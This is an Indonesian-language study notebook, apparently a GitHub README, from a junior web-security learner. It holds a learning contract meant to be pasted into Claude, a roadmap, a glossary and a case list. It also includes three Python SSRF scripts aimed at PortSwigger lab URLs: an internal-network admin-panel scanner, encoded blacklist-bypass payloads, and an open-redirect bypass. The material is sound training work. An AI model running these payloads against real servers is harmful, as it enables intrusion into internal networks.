# 🔐 Security Learning Notes
**Tujuan:** AI Agent Security Engineer
**GitHub:** faninda-dev
**Level:** Junior Security Researcher

---

## 📋 KONTRAK BELAJAR

### Aturan Mengajar
1. Analogi kehidupan sehari-hari untuk setiap konsep baru
2. Maksimal 3 paragraf per penjelasan
3. Selalu hubungkan ke konteks AI/AI Agent security
4. Salah paham → arahkan dengan pertanyaan, jangan langsung koreksi
5. Setiap perintah terminal/code WAJIB disertai:
   - Fungsinya apa
   - Kenapa pakai syntax itu
   - Kenapa tidak pakai alternatif lain
6. Tugas kecil 15-20 menit di akhir setiap topik
7. Satu konsep per sesi — tidak lanjut sebelum paham
8. Setiap konsep → bahas "bagaimana bisa disalahgunakan di AI?"
9. Praktik langsung — bukan teori panjang
10. Step-by-step yang jelas dan efisien

### Gaya Komunikasi Saya
- Santai dan langsung
- Sering upload screenshot untuk konfirmasi
- Sering tanya kalau ada istilah teknis yang tidak familiar
- Tidak suka penjelasan panjang tanpa praktek

---

## 🗺️ ROADMAP

### Fase 1 — Web Security (SEDANG BERJALAN)
- [x] Fondasi Internet & Jaringan
- [x] Reconnaissance & Tools
- [x] Tipe-tipe Serangan
- [x] Deep Dive Kasus Nyata
- [x] Python Dasar
- [x] SQL Injection (5 lab)
- [x] XSS — Reflected, Stored, DOM-based
- [x] CSRF + GitHub Pages exploit
- [x] SSRF — Basic, Internal Scan, Blacklist Bypass, Open Redirect Bypass
- [ ] Blind SSRF + Shellshock ← NEXT
- [ ] SSRF Cloud Metadata
- [ ] SSRF + RCE
- [ ] SSRF Fuzzing (ffuf + PayloadsAllTheThings)
- [ ] Authentication Attacks
- [ ] Business Logic Vulnerabilities
- [ ] Path Traversal
- [ ] XXE Injection
- [ ] TryHackMe — full attack simulation

### Fase 2 — AI Security
- [ ] Prompt Injection Advanced
- [ ] AI Agent RCE (CVE-2025-3248 Langflow)
- [ ] Supply Chain Attack
- [ ] OWASP Top 10 LLM

### Fase 3 — RAG Security
- [ ] RAG & Vector Database
- [ ] RAG Poisoning

### Fase 4 — Multi-Agent Security
- [ ] Multi-Agent Security
- [ ] Salami Slicing praktik

### Fase 5 — AI Agent Security Engineer 🎯
- [ ] Full AI Agent Red-teaming
- [ ] Bug bounty

---

## 📚 KONSEP YANG SUDAH DIKUASAI

### Analogi Penting
| Konsep | Analogi |
|--------|---------|
| TCP vs UDP | TCP = pesan ke kekasih (pasti sampai), UDP = kurir bodoamat (cepat) |
| IP Publik vs Lokal | Publik = alamat kompleks, Lokal = nomor rumah |
| Firewall | Penjaga di setiap pintu masuk |
| DNS | Buku kontak internet |
| SQL Injection | Pesan tersembunyi ke kasir database |
| XSS | Pengumuman mall yang mencuri dompet |
| CSRF | Tipu orang untuk kirim surat berbahaya |
| SSRF | Tipu kantor pos untuk kirim surat dari dalam gedung |
| Parameterized Queries | Pemisahan fundamental — input tidak bisa jadi perintah |
| Cloud Metadata | KTP server |
| Open Redirect | Pintu samping yang bisa redirect ke mana saja |

---

## 🛠️ TOOLS YANG TERINSTALL

| Tool | Versi | Fungsi |
|------|-------|--------|
| Python | 3.14.4 | Automation scripts |
| VSCode | Latest | Code editor |
| Burp Suite Community | v2026.4.3 | Web security testing |
| Nmap | v7.99 | Port scanning |
| requests (pip) | 2.34.2 | HTTP requests di Python |

---

## 💻 SCRIPT PYTHON YANG SUDAH DIBUAT

### 1. SSRF Internal Network Scanner
```python
# File: ssrf_scan.py
# Fungsi: Scan 255 IP untuk cari admin panel internal
import requests

LAB_URL = "https://YOUR-LAB-URL.web-security-academy.net"

for i in range(1, 256):
    target = f"http://192.168.0.{i}:8080/admin"
    try:
        response = requests.post(
            f"{LAB_URL}/product/stock",
            data={"stockApi": target},
            timeout=3
        )
        if response.status_code == 200:
            print(f"[FOUND] Admin panel at: {target}")
            break
        else:
            print(f"[-] {target} - Status: {response.status_code}")
    except:
        pass
```

### 2. SSRF Blacklist Bypass
```python
# File: ssrf_bypass.py
# Fungsi: Bypass filter dengan variasi encoding
import requests

LAB_URL = "https://YOUR-LAB-URL.web-security-academy.net"

payloads = [
    "http://127.1/Admin",
    "http://127.1/%2561dmin",
    "http://127.1/AdMin",
]

for payload in payloads:
    response = requests.post(
        f"{LAB_URL}/product/stock",
        data={"stockApi": payload},
        timeout=10
    )
    if "carlos" in response.text:
        print(f"[FOUND] {payload}")
        break
```

### 3. SSRF Open Redirect Bypass
```python
# File: ssrf_redirect.py
# Fungsi: Bypass filter via open redirect parameter
import requests

LAB_URL = "https://YOUR-LAB-URL.web-security-academy.net"

response = requests.post(
    f"{LAB_URL}/product/stock",
    data={"stockApi": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin"},
    timeout=10
)
print(f"Status: {response.status_code}")
```

---

## 🔍 KAMUS TEKNIS

| Term | Arti |
|------|------|
| Reconnaissance | Pengamatan/pengintaian target |
| Exploit | Memanfaatkan celah keamanan |
| Exfiltrate | Mencuri dan mengirim data keluar |
| Payload | Kode/data yang disuntikkan untuk exploit |
| Endpoint | URL spesifik yang menerima request |
| Session Token | Tiket masuk sementara setelah login |
| CSRF Token | Token unik untuk verifikasi request sah |
| Fetch | Mengambil/meminta data dari URL |
| Auth | Proses membuktikan identitas ke sistem |
| Whitelist | Daftar yang diizinkan |
| Blacklist | Daftar yang diblokir |
| Open Redirect | Redirect tanpa filter ke URL manapun |
| Blind SSRF | SSRF tanpa response balik ke attacker |
| Shellshock | Vulnerability bash untuk RCE |
| RCE | Remote Code Execution — jalankan perintah di server |
| Supply Chain Attack | Serangan lewat dependency/library pihak ketiga |

---

## 🚨 KASUS NYATA YANG DIPELAJARI

| Kasus | Teknik | Kerugian |
|-------|--------|----------|
| CyberStrikeAI | AI Autonomous Attack, Brute Force | 600 perangkat di 55 negara |
| Bybit | Social Engineering, UI Spoofing, Supply Chain | $1.5 miliar |
| Salami Slicing | Manipulasi AI Agent bertahap | $5 juta |
| BINKR/Bankrbot | Prompt Injection | $175.000 |
| Capital One 2019 | SSRF + AWS Metadata | Data 100 juta nasabah |

---

## 📌 SESI TERAKHIR

**Tanggal:** Juni 2026
**Yang diselesaikan:**
- SSRF with filter bypass via open redirection vulnerability ✅

**Selanjutnya:**
- Blind SSRF with Shellshock exploitation (EXPERT level)

**Cara mulai chat baru:**
1. Buka chat baru di Claude
2. Paste kontrak belajar + link repo ini
3. Tulis: "Lanjutkan dari sesi terakhir — Blind SSRF + Shellshock"
